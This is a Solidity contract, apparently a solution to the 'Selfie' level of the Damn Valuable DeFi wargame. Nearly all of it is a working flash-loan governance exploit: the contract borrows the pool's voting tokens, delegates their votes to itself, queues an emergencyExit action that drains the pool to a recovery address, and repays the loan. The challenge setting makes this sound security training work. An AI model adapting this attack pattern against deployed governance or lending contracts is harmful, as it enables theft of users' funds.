//SPDX-License-Identifier: MIT

pragma solidity ^0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

/**
 * @title AttackSelfie
 * @author Jbayonne
 * @notice This contract exploit the governance vulnerability of SelfiePool tanks to the flashloan function
 */
contract AttackSelfie is IERC3156FlashBorrower{

    using Address for address;

	SimpleGovernance public immutable GOV;
	SelfiePool public immutable TARGET;
	address public immutable RECOVERY;
	DamnValuableVotes public immutable TOKEN;

	constructor( SimpleGovernance _gov, SelfiePool _target, address _recovery, address token_ )
	{
		GOV = _gov;
		TARGET = _target;
		RECOVERY = _recovery;
		TOKEN = DamnValuableVotes(token_);
	}

	function onFlashLoan(
		address initiator,
		address token,
		uint256 amount,
		uint256 fee,
		bytes calldata data
	) external returns (bytes32){

		data;
		fee;
		initiator;
		// msg.sender == TARGET -> Here target give his votes to Attack contract
		TOKEN.delegate( address(this) );
		// encoding action function call
		bytes memory _data = abi.encodeWithSignature("emergencyExit(address)", RECOVERY);
		// push the action on governance contract
		address(GOV).functionCallWithValue( abi.encodeWithSignature("queueAction(address,uint128,bytes)", address(TARGET), 0, _data), 0 );
		// approve for repay
		IERC20(token).approve( address(TARGET), amount );
		return ( keccak256("ERC3156FlashBorrower.onFlashLoan") );
	}

	function attack( uint256 amount ) external returns (uint256 actionId) {
		TARGET.flashLoan( this, address( TOKEN ), amount, "0x" );
		actionId = GOV.getActionCounter() - 1;
	}
}